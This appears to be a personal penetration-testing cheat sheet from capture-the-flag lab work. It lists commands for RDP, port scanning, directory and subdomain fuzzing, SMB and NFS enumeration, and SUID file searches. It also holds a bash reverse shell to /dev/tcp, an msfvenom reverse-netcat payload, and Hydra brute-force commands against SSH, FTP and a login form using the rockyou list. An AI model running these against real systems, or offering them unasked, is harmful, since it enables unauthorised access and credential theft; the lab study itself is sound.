
# CLI
## rdp: 
`xfreerdp /u:{username} /p:{password} /v:{ip} /dynamic-resolution`
## netcat:
`nc -lvnp <PORT>`
- `-l`: Listen mode.
    
- `-v`: Verbose output (optional but recommended).
    
- `-n`: Disable DNS resolution (faster).
    
- `-p <PORT>`: Specify the port to listen on (e.g., `4444`).

Then
`bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1'`
// Research more ways to connect
## Gobuster:
- Directories
```
gobuster dir -u http://ip:port -w /home/Dragon/Code/wordlists/fuzz_php_special.txt -t 100 --timeout 60s
```
```
gobuster dir -u http://ip:port -w /home/Dragon/Code/wordlists/robots.txt
```
- Sub Domains
`gobuster dns -d ip -w /home/Dragon/Code/wordlists/subdomain.txt`


## Rustscan:
`rustscan -a ip -r 1-65535 --ulimit 5000 --timeout 1500`

with nmap
`rustscan -a ip -- -sV -sC`

Target a specific port:
`rustscan -a ip -p port -- -A -sC`

# nmap
`nmap -p- -T4 ip
`
## tcpdump
- listen {This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.}
`sudo tcpdump ip proto \\icmp -i tun0`

![[Pasted image 20250202160630.png]]

## metasploit
- netcat rev shell
`msfvenom -p cmd/unix/reverse_netcat lhost=10.8.30.74 lport=4444 R`
## Hydra:
`hydra -L /home/Dragon/Code/wordlists/rockyou.txt -p admin ip`

`hydra -l username -P /home/Dragon/Code/wordlists/rockyou.txt ssh://ip -V -I -t 64` 

`hydra -t 4 -l dale -P home/Dragon/Code/wordlists/rockyou.txt -vV ip ftp`

-t 4                    Number of parallel connections per target  
-l [user]               Points to the user who's account you're trying to compromise  
-P [path to dictionary] Points to the file containing the list of possible passwords  
-vV                     Sets verbose mode to very verbose, shows the login+pass combination for                             each attempt
## ffuf
`ffuf -u ip../FUZZ.fileExtension -w /home/Dragon/Code/wordlists/raft-small-words.txt`
- Note: run in full screen

- Post form
`hydra -l username -P /home/Dragon/Code/wordlists/rockyou.txt lookup.thm http-post-form "/login:username=^USER^&password=^PASS^F:wrong password" -V -I -t 64`


## Hashcat
- cd in location of pswd list
`hashcat --stdout -r /home/Dragon/Code/wordlists/hashcat_rules/best64.rule password_list.txt > mutated_passwords.txt`

## Enum4linux

`enum4linux -h` : Manual

```
enum4linux -U -o 192.168.1.200
```
**TAG**            **FUNCTION**  
- U            get userlist  
- M            get machine list  
- N             get namelist dump (different from -U and-M)  
- S             get sharelist  
- P             get password policy information  
- G             get group and member list
- a             all of the above (full basic enumeration)

### SMB client 
`smbclient //[IP]/[SHARE]`

Followed by the tags:

-U [name] : to specify the user

-p [port] : to specify the port

more "filename" to cat

## NFS
- get shares
`/usr/sbin/showmount -e ip`
- mount
sudo mount -t nfs ip:share /mnt -nolock
## General:
`find / -name "*flag*" 2>/dev/null`
`find / -perm -u=s -type f 2>/dev/null`
`sudo find / -type d -name 'dirName'`

# Notes:
## ssh with RSA
Use private key
Do: chmod 600 filename
Then: 
	ssh -i  rsaprivefilename user@ip


# Pics
- telnet
![[Pasted image 20250202161214.png]]
